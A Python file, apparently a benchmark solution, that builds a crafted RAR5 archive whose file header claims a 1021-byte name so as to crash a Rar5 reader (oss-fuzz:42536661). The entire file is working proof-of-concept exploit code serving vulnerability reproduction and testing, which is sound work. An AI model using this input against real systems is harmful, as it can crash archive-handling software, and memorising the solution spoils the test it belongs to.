import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability (oss-fuzz:42536661) in the Rar5 reader is caused by
        reading a file's name size, allocating memory for the name, and only then
        checking if the size is too large. The check is against a maximum of
        `UCHAR_MAX * 4` (1020 bytes). A crafted archive with a name length
        greater than 1020 can trigger an excessive memory allocation, leading
        to a crash.

        This PoC constructs a minimal valid RAR5 archive with a single file header
        that specifies a name length of 1021 bytes.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """

        def vint(n: int) -> bytes:
            """Encodes an integer into the RAR5 variable-length integer format."""
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                res.append(byte)
            return bytes(res)

        # Start with the RAR5 marker.
        poc = bytearray(b"\x52\x61\x72\x21\x1a\x07\x01\x00")

        # Append a minimal Main Archive Header.
        # A RAR5 block consists of: CRC32, Size, and Payload.
        main_payload = vint(1) + vint(0)  # Type=Main, Flags=0
        main_data = vint(len(main_payload)) + main_payload
        poc += zlib.crc32(main_data).to_bytes(4, 'little')
        poc += main_data

        # Append the malicious File Header.
        # The vulnerability is triggered if name_size > 1020. We use 1021.
        name_size = 1021
        file_name = b'A' * name_size

        file_payload = b"".join([
            vint(2),          # Type: File Header
            vint(0),          # Header Flags
            vint(0),          # File Flags
            vint(0),          # Unpacked Size
            vint(0x20),       # File Attributes (Archive)
            vint(0x30),       # Compression Info (Store)
            vint(2),          # Host OS (Unix)
            vint(name_size),  # Malicious Name Length
            file_name,
        ])
        
        file_data = vint(len(file_payload)) + file_payload
        poc += zlib.crc32(file_data).to_bytes(4, 'little')
        poc += file_data

        # Append an End of Archive Header to create a well-formed archive.
        end_payload = vint(5) + vint(0)  # Type=End, Flags=0
        end_data = vint(len(end_payload)) + end_payload
        poc += zlib.crc32(end_data).to_bytes(4, 'little')
        poc += end_data

        return bytes(poc)